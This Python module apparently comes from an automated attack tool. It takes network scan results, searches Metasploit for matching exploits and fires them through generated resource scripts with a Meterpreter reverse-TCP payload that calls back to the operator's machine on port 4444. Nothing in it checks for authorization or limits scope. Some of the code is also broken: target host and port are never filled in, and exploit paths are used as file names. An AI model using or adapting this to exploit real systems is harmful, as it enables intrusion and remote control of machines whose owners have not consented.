import asyncio
import json
import logging
import os
from typing import Dict, Any, List, Optional
from pathlib import Path

logger = logging.getLogger(__name__)

class MetasploitManager:
    def __init__(self):
        self.workspace = "AI_MAL_workspace"
        self.resource_dir = Path("msf_resources")
        self.resource_dir.mkdir(exist_ok=True)
        
    async def find_exploits(self, scan_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find potential Metasploit exploits based on scan results."""
        try:
            exploits = []
            
            # Extract service information
            for host in scan_results.get('hosts', []):
                for port in host.get('ports', []):
                    service = port.get('service', {})
                    if service:
                        # Search for exploits based on service name and version
                        service_exploits = await self._search_exploits(
                            service.get('name', ''),
                            service.get('product', ''),
                            service.get('version', '')
                        )
                        exploits.extend(service_exploits)
            
            return exploits
            
        except Exception as e:
            logger.error(f"Error finding exploits: {str(e)}")
            return []
    
    async def run_exploits(self, exploits: List[Dict[str, Any]]) -> None:
        """Run Metasploit exploits."""
        try:
            for exploit in exploits:
                # Generate resource script
                resource_script = self._generate_resource_script(exploit)
                
                # Save resource script
                script_path = self.resource_dir / f"exploit_{exploit['name']}.rc"
                with open(script_path, 'w') as f:
                    f.write(resource_script)
                
                # Run Metasploit with resource script
                await self._run_msf_console(script_path)
                
        except Exception as e:
            logger.error(f"Error running exploits: {str(e)}")
    
    async def _search_exploits(self, service_name: str, product: str, version: str) -> List[Dict[str, Any]]:
        """Search for Metasploit exploits matching service information."""
        try:
            # Build search command
            cmd = ['msfconsole', '-q', '-x']
            
            # Create search command
            search_cmd = f"search type:exploit {service_name} {product} {version}"
            cmd.append(search_cmd)
            
            # Run search
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Exploit search failed: {stderr.decode()}")
                return []
            
            # Parse results
            exploits = []
            for line in stdout.decode().split('\n'):
                if 'exploit/' in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        exploits.append({
                            'name': parts[0],
                            'disclosure_date': parts[1],
                            'rank': parts[2],
                            'description': ' '.join(parts[3:])
                        })
            
            return exploits
            
        except Exception as e:
            logger.error(f"Error searching exploits: {str(e)}")
            return []
    
    def _generate_resource_script(self, exploit: Dict[str, Any]) -> str:
        """Generate Metasploit resource script for an exploit."""
        script = f"""workspace -a {self.workspace}
use {exploit['name']}
set RHOSTS {exploit.get('target', '')}
set RPORT {exploit.get('port', '')}
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {self._get_local_ip()}
set LPORT 4444
exploit -j
"""
        return script
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"
    
    async def _run_msf_console(self, resource_script: Path) -> None:
        """Run Metasploit console with resource script."""
        try:
            cmd = ['msfconsole', '-q', '-r', str(resource_script)]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Metasploit execution failed: {stderr.decode()}")
                return
            
            logger.info(f"Metasploit output: {stdout.decode()}")
            
        except Exception as e:
            logger.error(f"Error running Metasploit: {str(e)}") 